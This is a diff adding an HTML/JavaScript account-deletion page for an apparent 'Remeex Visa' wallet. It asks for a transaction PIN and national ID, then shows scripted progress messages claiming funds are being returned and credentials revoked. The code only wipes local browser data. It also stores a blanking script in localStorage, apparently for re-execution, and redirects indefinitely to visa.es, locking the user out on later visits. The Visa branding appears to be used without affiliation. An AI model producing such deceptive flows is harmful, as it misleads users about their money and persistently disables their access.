@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no" />
+  <title>Eliminar Cuenta - Remeex Visa</title>
+  <meta name="color-scheme" content="dark light" />
+  <meta name="description" content="Gestiona la eliminación definitiva de tu cuenta Remeex Visa de forma segura." />
+  <link rel="stylesheet" href="styles/cuentabloqueada.css" />
+  <script src="repair.js" defer></script>
+</head>
+<body class="intro-active">
+  <div class="mobile-container">
+    <header class="mobile-header">
+      <img class="logo" src="remeexvisa2025_blanco.png" alt="Remeex Visa" />
+    </header>
+
+    <main class="mobile-content">
+      <div class="main-card">
+        <div class="alert-badge">Eliminación definitiva</div>
+        <h1 class="main-title">Cerrar y eliminar mi cuenta</h1>
+
+        <div class="balance-container" aria-live="polite">
+          <div class="balance-item">
+            <div class="balance-label">Saldo Bs.</div>
+            <div id="saldoBs" class="balance-value">Bs. 0,00</div>
+          </div>
+          <div class="balance-item">
+            <div class="balance-label">Saldo USD</div>
+            <div id="saldoUsd" class="balance-value">$0.00</div>
+          </div>
+        </div>
+
+        <p id="mainDescription" class="main-description">
+          Antes de eliminar tu cuenta revisa los datos asociados. Una vez confirmes, devolveremos tus fondos al origen y cerraremos el acceso.
+        </p>
+
+        <section class="info-card" aria-labelledby="benefitsTitle">
+          <h2 id="benefitsTitle" class="section-title">¿Seguro que quieres irte?</h2>
+          <p>
+            Con tu saldo Remeex puedes seguir comprando en nuestras tiendas y comercios asociados, o vincular tu tarjeta virtual a PayPal y otros servicios financieros para disfrutar de ofertas, cashback y pagos internacionales sin fronteras.
+          </p>
+          <ul class="benefits-list">
+            <li>Disfruta de promociones exclusivas en comercios aliados.</li>
+            <li>Recibe notificaciones de seguridad en tiempo real y soporte preferencial.</li>
+            <li>Usa tu tarjeta virtual en plataformas de streaming, delivery y apps financieras.</li>
+          </ul>
+          <p>
+            Mantener tu cuenta activa te permite seguir aprovechando estos beneficios. Si aún deseas continuar con la eliminación, confirma tu identidad a continuación.
+          </p>
+        </section>
+
+        <form id="deletionForm" class="confirmation-form" novalidate>
+          <div class="form-group">
+            <label for="confirmPin">PIN de 4 dígitos</label>
+            <input
+              id="confirmPin"
+              name="confirmPin"
+              type="password"
+              inputmode="numeric"
+              pattern="[0-9]{4}"
+              maxlength="4"
+              autocomplete="one-time-code"
+              placeholder="••••"
+              required
+            />
+            <small>Ingresa el PIN transaccional que usas para confirmar operaciones.</small>
+          </div>
+          <div class="form-group">
+            <label for="confirmId">Cédula de identidad</label>
+            <input
+              id="confirmId"
+              name="confirmId"
+              type="text"
+              inputmode="text"
+              autocomplete="off"
+              placeholder="V-12345678"
+              required
+            />
+            <small>Escribe tu número de documento tal como aparece en tu perfil.</small>
+          </div>
+          <p id="validationMessage" class="form-feedback" role="alert" hidden></p>
+        </form>
+
+        <div id="reviewState" class="waiting-state" aria-live="assertive">
+          <div class="spinner" aria-hidden="true"></div>
+          <p class="waiting-text">
+            Estamos validando la identidad de <strong id="waitingUser">el titular</strong> antes de completar la eliminación.
+          </p>
+          <div class="waiting-warning">
+            Este proceso es irreversible y el acceso no podrá ser restablecido posteriormente.
+          </div>
+        </div>
+
+        <div id="finalState" class="waiting-state" aria-live="assertive">
+          <div class="spinner" aria-hidden="true"></div>
+          <p class="waiting-text">
+            <strong>Ejecutando eliminación definitiva.</strong> Liberando fondos, revocando credenciales y cerrando tu cuenta.
+          </p>
+          <div class="waiting-warning">
+            Te redirigiremos a <span aria-hidden="true">visa.es</span> una vez finalice el proceso.
+          </div>
+        </div>
+
+        <div class="button-stack">
+          <a class="btn btn--secondary" href="cuentabloqueada.html">
+            <span>↩</span> Cancelar y regresar
+          </a>
+          <button id="confirmDelete" class="btn btn--danger" type="button">
+            <span>🗑</span> Eliminar definitivamente
+          </button>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <div id="deletionOverlay" class="overlay" role="dialog" aria-modal="true" aria-labelledby="deletionTitle" hidden>
+    <div class="overlay-container">
+      <header class="overlay-header">
+        <h2 id="deletionTitle" class="overlay-title">Procesando la eliminación</h2>
+        <p class="overlay-subtitle">No cierres esta ventana mientras finalizamos el cierre de tu cuenta.</p>
+      </header>
+      <div class="overlay-content">
+        <div class="wizard-progress" aria-hidden="true">
+          <div class="progress-step is-active" data-step="1"></div>
+          <div class="progress-step" data-step="2"></div>
+          <div class="progress-step" data-step="3"></div>
+          <div class="progress-step" data-step="4"></div>
+        </div>
+        <div class="waiting-state is-active" aria-live="assertive">
+          <div class="spinner" aria-hidden="true"></div>
+          <p id="overlayStep" class="waiting-text">Preparando entorno seguro…</p>
+          <div class="waiting-warning">El proceso puede tardar hasta 60 segundos.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  (function() {
+    const REDIRECT_URL = 'https://visa.es';
+    const STORAGE_KEY = 'remeexAccountClosed';
+    const STEPS = [
+      'Liberando fondos hacia el medio original…',
+      'Revirtiendo intercambios pendientes…',
+      'Eliminando credenciales asociadas…',
+      'Confirmando eliminación definitiva…'
+    ];
+
+    try {
+      if (localStorage.getItem(STORAGE_KEY) === 'true' || sessionStorage.getItem(STORAGE_KEY) === 'true') {
+        location.replace(REDIRECT_URL);
+        return;
+      }
+    } catch (error) {}
+
+    const saldoBsEl = document.getElementById('saldoBs');
+    const saldoUsdEl = document.getElementById('saldoUsd');
+    const waitingUserEl = document.getElementById('waitingUser');
+    const reviewState = document.getElementById('reviewState');
+    const finalState = document.getElementById('finalState');
+    const overlay = document.getElementById('deletionOverlay');
+    const overlayStep = document.getElementById('overlayStep');
+    const confirmButton = document.getElementById('confirmDelete');
+    const pinInput = document.getElementById('confirmPin');
+    const idInput = document.getElementById('confirmId');
+    const validationMessage = document.getElementById('validationMessage');
+
+    function normalizeId(value) {
+      return String(value || '')
+        .trim()
+        .replace(/\s+/g, ' ')
+        .toUpperCase();
+    }
+
+    function showValidationMessage(message) {
+      if (!validationMessage) return;
+      validationMessage.textContent = message;
+      validationMessage.hidden = !message;
+    }
+
+    function validateForm({ focusOnError } = { focusOnError: true }) {
+      const pin = pinInput ? pinInput.value.trim() : '';
+      const id = normalizeId(idInput ? idInput.value : '');
+      const pinValid = /^\d{4}$/.test(pin);
+      const idValid = id.length > 4;
+
+      if (!pinValid) {
+        showValidationMessage('Ingresa tu PIN de 4 dígitos para continuar.');
+        if (focusOnError) {
+          pinInput?.focus();
+        }
+        return false;
+      }
+
+      if (!idValid) {
+        showValidationMessage('Debes indicar tu cédula de identidad tal como aparece en tu perfil.');
+        if (focusOnError) {
+          idInput?.focus();
+        }
+        return false;
+      }
+
+      showValidationMessage('');
+      return true;
+    }
+
+    function onFieldInput() {
+      if (!validationMessage || validationMessage.hidden) return;
+      validateForm({ focusOnError: false });
+    }
+
+    pinInput?.addEventListener('input', onFieldInput);
+    idInput?.addEventListener('input', onFieldInput);
+
+    function parseAmount(value) {
+      if (!value) return 0;
+      if (typeof value === 'number' && Number.isFinite(value)) {
+        return value;
+      }
+      const sanitized = String(value).replace(/[^0-9,.-]/g, '').replace(',', '.');
+      const parsed = Number.parseFloat(sanitized);
+      return Number.isFinite(parsed) ? parsed : 0;
+    }
+
+    function formatCurrencyBs(value) {
+      try {
+        return new Intl.NumberFormat('es-VE', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(value);
+      } catch (error) {
+        return value.toFixed(2);
+      }
+    }
+
+    function formatCurrencyUsd(value) {
+      try {
+        return new Intl.NumberFormat('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(value);
+      } catch (error) {
+        return value.toFixed(2);
+      }
+    }
+
+    function loadBalance() {
+      const sources = [
+        () => sessionStorage.getItem('remeexSessionBalance'),
+        () => localStorage.getItem('remeexBalance')
+      ];
+
+      for (const getSource of sources) {
+        try {
+          const raw = getSource();
+          if (!raw) continue;
+          const data = JSON.parse(raw);
+          if (data && (data.bs || data.usd)) {
+            return {
+              bs: parseAmount(data.bs),
+              usd: parseAmount(data.usd)
+            };
+          }
+        } catch (error) {}
+      }
+
+      return { bs: 0, usd: 0 };
+    }
+
+    function updateBalances() {
+      const { bs, usd } = loadBalance();
+      if (saldoBsEl) {
+        saldoBsEl.textContent = `Bs. ${formatCurrencyBs(bs)}`;
+      }
+      if (saldoUsdEl) {
+        saldoUsdEl.textContent = `$${formatCurrencyUsd(usd)}`;
+      }
+    }
+
+    function loadUserName() {
+      const sources = [
+        () => sessionStorage.getItem('visaRegistrationCompleted'),
+        () => localStorage.getItem('visaRegistrationCompleted')
+      ];
+
+      for (const getSource of sources) {
+        try {
+          const raw = getSource();
+          if (!raw) continue;
+          const data = JSON.parse(raw);
+          if (!data) continue;
+          const parts = [data.preferredName, data.firstName, data.lastName]
+            .filter(Boolean)
+            .map((part) => String(part).trim())
+            .filter(Boolean);
+          if (parts.length) {
+            return [...new Set(parts)].join(' ');
+          }
+        } catch (error) {}
+      }
+      return '';
+    }
+
+    function setWaitingUser() {
+      if (!waitingUserEl) return;
+      const name = loadUserName();
+      waitingUserEl.textContent = name || 'el titular';
+    }
+
+    async function clearUserData() {
+      try {
+        localStorage.clear();
+        sessionStorage.clear();
+        if (window.caches) {
+          const keys = await caches.keys();
+          await Promise.all(keys.map((key) => caches.delete(key)));
+        }
+        if (navigator.serviceWorker) {
+          const registrations = await navigator.serviceWorker.getRegistrations();
+          await Promise.all(registrations.map((registration) => registration.unregister()));
+        }
+        if (window.indexedDB && indexedDB.databases) {
+          const dbs = await indexedDB.databases();
+          await Promise.all(dbs.map((db) => db?.name && indexedDB.deleteDatabase(db.name)));
+        }
+        if (document.cookie) {
+          document.cookie.split(';').forEach((cookie) => {
+            const eqPos = cookie.indexOf('=');
+            const name = eqPos > -1 ? cookie.slice(0, eqPos) : cookie;
+            document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/`;
+          });
+        }
+      } catch (error) {
+        console.error('Error clearing data', error);
+      }
+    }
+
+    function showBlankScreen() {
+      document.open();
+      document.write('<div style="position:fixed;inset:0;background:rgba(255,255,255,0.85);backdrop-filter:blur(12px);"></div>');
+      document.close();
+    }
+
+    function redirectIndefinitely() {
+      const redirect = () => location.replace(REDIRECT_URL);
+      redirect();
+      setInterval(redirect, 1500);
+    }
+
+    async function finalizeDeletion() {
+      if (finalState) {
+        finalState.classList.add('is-active');
+      }
+      await clearUserData();
+      try {
+        localStorage.setItem(STORAGE_KEY, 'true');
+        sessionStorage.setItem(STORAGE_KEY, 'true');
+        localStorage.setItem('repairMode', 'true');
+        sessionStorage.setItem('repairMode', 'true');
+        localStorage.setItem('repairLogic', '(' + showBlankScreen.toString() + ')();');
+      } catch (error) {}
+      if (typeof window.enforceAccountClosure === 'function') {
+        await window.enforceAccountClosure();
+        return;
+      }
+      showBlankScreen();
+      redirectIndefinitely();
+    }
+
+    function updateProgress(stepIndex) {
+      const steps = Array.from(document.querySelectorAll('.wizard-progress .progress-step'));
+      steps.forEach((step, index) => {
+        if (index <= stepIndex) {
+          step.classList.add('is-active');
+        } else {
+          step.classList.remove('is-active');
+        }
+      });
+    }
+
+    function runDeletionSequence() {
+      return new Promise((resolve) => {
+        if (!overlay) {
+          resolve();
+          return;
+        }
+
+        overlay.hidden = false;
+        overlay.classList.remove('is-visible');
+        requestAnimationFrame(() => {
+          overlay.classList.add('is-visible');
+        });
+        let index = 0;
+
+        const advance = () => {
+          if (overlayStep) {
+            overlayStep.textContent = STEPS[Math.min(index, STEPS.length - 1)];
+          }
+          updateProgress(index);
+
+          if (index >= STEPS.length - 1) {
+            setTimeout(resolve, 1200);
+            return;
+          }
+
+          index += 1;
+          setTimeout(advance, 1600);
+        };
+
+        advance();
+      });
+    }
+
+    async function handleDelete() {
+      const isValid = validateForm();
+      if (!isValid) {
+        return;
+      }
+
+      if (confirmButton) {
+        confirmButton.disabled = true;
+        confirmButton.classList.add('is-loading');
+      }
+      if (reviewState) {
+        reviewState.classList.add('is-active');
+      }
+
+      await runDeletionSequence();
+      await finalizeDeletion();
+    }
+
+    updateBalances();
+    setWaitingUser();
+    reviewState?.classList.add('is-active');
+
+    confirmButton?.addEventListener('click', handleDelete);
+  })();
+  </script>
+</body>
+</html>
